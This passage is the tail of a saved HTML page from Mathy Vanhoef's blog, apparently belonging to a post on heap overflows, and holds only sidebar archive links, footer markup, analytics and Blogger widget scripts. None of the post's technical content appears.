►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2012-01-01T00:00:00%2B01:00&amp;updated-max=2013-01-01T00:00:00%2B01:00&amp;max-results=9">
2012
</a>
<span class="post-count" dir="ltr">(9)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_11_01_archive.html">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_09_01_archive.html">
September
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_08_01_archive.html">
August
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_07_01_archive.html">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_06_01_archive.html">
June
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_05_01_archive.html">
May
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_02_01_archive.html">
February
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2012_01_01_archive.html">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2011-01-01T00:00:00%2B01:00&amp;updated-max=2012-01-01T00:00:00%2B01:00&amp;max-results=5">
2011
</a>
<span class="post-count" dir="ltr">(5)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2011_10_01_archive.html">
October
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2011_08_01_archive.html">
August
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=BlogArchive&amp;widgetId=BlogArchive1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;BlogArchive1&quot;));" target="configBlogArchive1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div></div>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
 
</div>
 
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot no-items section" id="footer-1"></div>
<table border="0" cellpadding="0" cellspacing="0" class="section-columns columns-2">
<tbody>
<tr>
<td class="first columns-cell">
<div class="foot no-items section" id="footer-2-1"></div>
</td>
<td class="columns-cell">
<div class="foot no-items section" id="footer-2-2"></div>
</td>
</tr>
</tbody>
</table>
 
<div class="foot section" id="footer-3"><div class="widget Attribution" data-version="1" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Template images by <a href="http://jasonmorrow.etsy.com/" target="_blank">Jason Morrow</a>. Powered by <a href="https://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=Attribution&amp;widgetId=Attribution1&amp;action=editWidget&amp;sectionId=footer-3" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Attribution1&quot;));" target="configAttribution1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
 
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<script type="text/javascript">
        var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-35642360-1']);
        _gaq.push(['_trackPageview']);
        (function() {
          var ga = document.createElement('script');
          ga.type = 'text/javascript';
          ga.async = true;
          ga.src = (document.location.protocol == 'https:' ?
                    'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
          var s = document.getElementsByTagName('script')[0];
          s.parentNode.insertBefore(ga, s);
        })();
      </script>
<script type="text/javascript" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/1045850488-widgets.js"></script>
<script type="text/javascript" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/plusone.js" gapi_processed="true"></script>
<script type="text/javascript">
_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d3500917063499850097','//www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html','3500917063499850097');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '3500917063499850097', 'bloggerUrl': 'https://www.blogger.com', 'title': 'Mathy Vanhoef', 'pageType': 'item', 'postId': '1709971016142527507', 'url': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html', 'canonicalUrl': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html', 'homepageUrl': 'http://www.mathyvanhoef.com/', 'searchUrl': 'http://www.mathyvanhoef.com/search', 'canonicalHomepageUrl': 'http://www.mathyvanhoef.com/', 'blogspotFaviconUrl': 'http://www.mathyvanhoef.com/favicon.ico', 'enabledCommentProfileImages': true, 'adultContent': false, 'analyticsAccountNumber': 'UA-35642360-1', 'useUniversalAnalytics': false, 'pageName': 'Understanding the Heap \x26 Exploiting Heap Overflows', 'pageTitle': 'Mathy Vanhoef: Understanding the Heap \x26 Exploiting Heap Overflows', 'encoding': 'UTF-8', 'locale': 'en_GB', 'localeUnderscoreDelimited': 'en_gb', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'languageDirection': 'ltr', 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Mathy Vanhoef - Atom\x22 href\x3d\x22http://www.mathyvanhoef.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Mathy Vanhoef - RSS\x22 href\x3d\x22http://www.mathyvanhoef.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Mathy Vanhoef - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/3500917063499850097/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Mathy Vanhoef - Atom\x22 href\x3d\x22http://www.mathyvanhoef.com/feeds/1709971016142527507/comments/default\x22 /\x3e\n', 'meTag': '', 'openIdOpTag': '', 'postImageThumbnailUrl': 'http://4.bp.blogspot.com/-5YeGAw-FLMM/UPvsS5PBRiI/AAAAAAAAAPc/avsu-WhaVEk/s72-c/linkedlist_small.png', 'postImageUrl': 'http://4.bp.blogspot.com/-5YeGAw-FLMM/UPvsS5PBRiI/AAAAAAAAAPc/avsu-WhaVEk/s1600/linkedlist_small.png', 'mobileHeadScript': '', 'adsenseClientId': 'pub-2753532741085396', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1803938243-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/b1f29a73a8a0bdce', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Google+', 'key': 'googlePlus', 'shareMessage': 'Share to Google+', 'target': 'googleplus'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en_GB\x27};\x3c/script\x3e'}}}, {'name': 'features', 'data': {'templateBrowserTheme': true, 'widgetVisibility': true}}, {'name': 'messages', 'data': {'adsGoHere': 'Ads go here', 'archive': 'Archive', 'authorSaid': '%1 said...', 'authorSaidWithLink': '\x3ca href\x3d\x22%2\x22 rel\x3d\x22nofollow\x22\x3e%1\x3c/a\x3e said...', 'blogArchive': 'Blog Archive', 'by': 'By', 'byAuthor': 'By %1', 'byAuthorLink': 'By \x3ca href\x3d\x22%2\x22\x3e%1\x3c/a\x3e', 'comments': 'Comments', 'configurationRequired': 'Configuration required', 'deleteBacklink': 'Delete Backlink', 'deleteComment': 'Delete Comment', 'edit': 'Edit', 'euCookieNotice': 'This site uses cookies from Google to deliver its services, to personalise ads and to analyse traffic. Information about your use of this site is shared with Google. By using this site, you agree to its use of cookies.', 'euCookieResponsibility': 'It is your responsibility to notify your visitors about cookies used on your blog. See http://www.blogger.com/go/cookiechoices for more details.', 'emailAddress': 'Email Address', 'getEmailNotifications': 'Get email notifications', 'gotIt': 'Got it', 'hidden': 'Hidden', 'home': 'Home', 'joinTheConversation': 'Join the conversation', 'keepReading': 'Keep reading', 'labels': 'Labels', 'latestPosts': 'Latest posts', 'learnMore': 'Learn more', 'loadMorePosts': 'Load more posts', 'loading': 'Loading...', 'myBlogList': 'My Blog List', 'myFavoriteSites': 'My favourite sites', 'myPhoto': 'My photo', 'newer': 'Newer', 'newerPosts': 'Newer Posts', 'newest': 'Newest', 'noResultsFound': 'No results found', 'noTitle': 'No title', 'numberOfComments': '{numComments,plural, \x3d0{No comments}\x3d1{1 comment}other{# comments}}', 'older': 'Older', 'olderPosts': 'Older Posts', 'oldest': 'Oldest', 'onlyTeamMembersCanComment': 'Note: only a member of this blog may post a comment.', 'popularPosts': 'Popular Posts', 'popularPostsFromThisBlog': 'Popular posts from this blog', 'postAComment': 'Post a Comment', 'postedBy': 'Posted by', 'postedByAuthor': 'Posted by %1', 'postedByAuthorLink': 'Posted by \x3ca href\x3d\x22%2\x22\x3e%1\x3c/a\x3e', 'readMore': 'Read more', 'recentPosts': 'Recent posts', 'reportAbuse': 'Report Abuse', 'search': 'Search', 'searchBlog': 'Search blog', 'share': 'Share', 'showAll': 'Show All', 'showLess': 'Show less', 'showMore': 'Show more', 'someOfMyFavoriteSites': 'Some of my favourite sites', 'subscribe': 'Subscribe', 'subscribeTo': 'Subscribe to:', 'subscribeToThisBlog': 'Subscribe to this blog', 'theresNothingHere': 'There\x27s nothing here.', 'viewAll': 'View all', 'visible': 'Visible', 'visitProfile': 'Visit profile', 'widgetNotAvailableInPreview': 'This content is not available in blog preview.', 'widgetNotAvailableOnHttps': 'This content isn\x27t available over encrypted connections yet.'}}, {'name': 'skin', 'data': {'vars': {'description_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'tabs_text_color': '#444444', 'widget_link_visited_color': '#4d469c', 'image_shadow_spread': '0', 'body_background': '#eeeeee url(http://themes.googleusercontent.com/image?id\x3d0BwVBOzw_-hbMNjViMzQ0ZDEtMWU1NS00ZTBkLWFjY2EtZjM5YmU4OTA2MjBm) repeat-x fixed top center /* Credit: Jason Morrow (http://jasonmorrow.etsy.com) */', 'mobile_background_size': 'auto', 'date_background': 'transparent none no-repeat scroll top left', 'image_border_color': 'transparent', 'tabs_border_color': '#999999', 'widget_title_font': 'normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'body_background_size': 'auto', 'header_padding_top': '22px', 'description_text_color': '#444444', 'outer_shadow_spread': '0', 'post_title_font': 'normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'body_text_color': '#444444', 'widget_text_color': '#444444', 'header_background_gradient': 'none', 'date_position': 'static', 'image_border_radius': '0', 'tabs_background_color': '#eeeeee', 'date_header_border_radius_top': '0', 'body_background_gradient_cap': 'none', 'widget_outer_margin_top': '0', 'widget_alternate_text_color': '#666666', 'link_visited_color': '#4d469c', 'header_margin_top': '0', 'shadow_spread': '20px', 'widget_border_bevel_color': 'transparent', 'mobile_button_color': '#ffffff', 'tabs_selected_text_color': '#ffffff', 'date_text_color': '#444444', 'post_background_color': '#ffffff', 'header_margin_bottom': '0', 'widget_padding_side': '15px', 'date_header_position': '15px', 'link_color': '#3778cd', 'title_shadow_spread': '-1px', 'date_last_space_bottom': '20px', 'widget_border_radius': '0', 'date_space': '30px', 'widget_border_color': '#eeeeee', 'tabs_background_gradient': 'url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png)', 'header_font': 'normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_padding_top': '8px', 'separator_outdent': '15px', 'startSide': 'left', 'post_border_bevel_color': '#eeeeee', 'feed_link_visited_color': '#4d469c', 'tabs_font': 'normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'date_padding_bottom': '0', 'date_border_color': '#eeeeee', 'widget_title_text_color': '#444444', 'feed_link_hover_color': '#3778cd', 'widget_link_hover_color': '#3778cd', 'footer_text_color': '#444444', 'tabs_selected_background_color': '#666666', 'feed_text_color': '#444444', 'date_last_border_radius_bottom': '0', 'post_title_text_color': '#444444', 'date_first_border_radius_top': '0', 'endSide': 'right', 'date_side': 'right', 'mobile_background_overlay': 'transparent none repeat scroll top left', 'image_background_color': 'transparent', 'post_first_padding_top': '0', 'list_separator_border_size': '1px', 'body_background_color': '#eeeeee', 'header_text_color': '#444444', 'pager_border_radius_top': '0', 'post_border_color': '#eeeeee', 'widget_link_color': '#3778cd', 'widget_background_color': '#ffffff', 'date_border_size': '0', 'body_font': 'normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'footer_background_gradient': 'none', 'link_hover_color': '#3778cd', 'header_background_color': 'transparent', 'keycolor': '#eeeeee', 'widget_outer_background_gradient': 'none', 'pager_space_top': '1em', 'footer_background_color': '#ffffff', 'feed_link_color': '#3778cd', 'widget_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'pager_background_color': '#ffffff', 'title_separator_border_size': '1px', 'date_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_outer_background_color': 'transparent'}, 'override': ''}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'title': 'Understanding the Heap \x26 Exploiting Heap Overflows', 'description': 'This post will begin with a high level description of the heap and slowly builds up untill you able to write your own heap-based exploits. W...', 'featuredImage': 'http://4.bp.blogspot.com/-5YeGAw-FLMM/UPvsS5PBRiI/AAAAAAAAAPc/avsu-WhaVEk/s1600/linkedlist_small.png', 'url': 'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html', 'type': 'item', 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isSearch': false, 'postId': 1709971016142527507}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', null, document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', null, document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'crosscol', null, document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'href': 'http://www.mathyvanhoef.com/', 'title': 'Home', 'isCurrentPage': false}, {'href': 'http://www.mathyvanhoef.com/p/publications.html', 'title': 'Publications', 'isCurrentPage': false, 'id': '5694411682882214890'}, {'href': 'http://www.mathyvanhoef.com/p/tools.html', 'title': 'Tools', 'isCurrentPage': false, 'id': '7604039972729709197'}, {'href': 'http://www.mathyvanhoef.com/p/about.html', 'title': 'About', 'isCurrentPage': false, 'id': '5424981829575763592'}], 'mobile': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', null, document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'showBacklinks': true, 'postId': '1709971016142527507', 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1463269384-lbx__en_gb.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar-right-1', null, document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AdSenseView', new _WidgetInfo('AdSense1', 'sidebar-right-1', null, document.getElementById('AdSense1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LinkListView', new _WidgetInfo('LinkList1', 'sidebar-right-1', null, document.getElementById('LinkList1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_SubscribeView', new _WidgetInfo('Subscribe1', 'sidebar-right-1', null, document.getElementById('Subscribe1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', null, document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading...'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', null, document.getElementById('Attribution1'), {'attribution': 'Template images by \x3ca href\x3d\x27http://jasonmorrow.etsy.com\x27 target\x3d\x27_blank\x27\x3eJason Morrow\x3c/a\x3e. Powered by \x3ca href\x3d\x27https://www.blogger.com\x27 target\x3d\x27_blank\x27\x3eBlogger\x3c/a\x3e.'}, 'displayModeFull'));
</script>

<iframe name="oauth2relay865759786" id="oauth2relay865759786" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/postmessageRelay.html" tabindex="-1" style="width: 1px; height: 1px; position: absolute; top: -100px;"></iframe><link type="text/css" rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/368954415-lightbox_bundle.css"><script type="text/javascript" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/1463269384-lbx__en_gb.js"></script></body></html>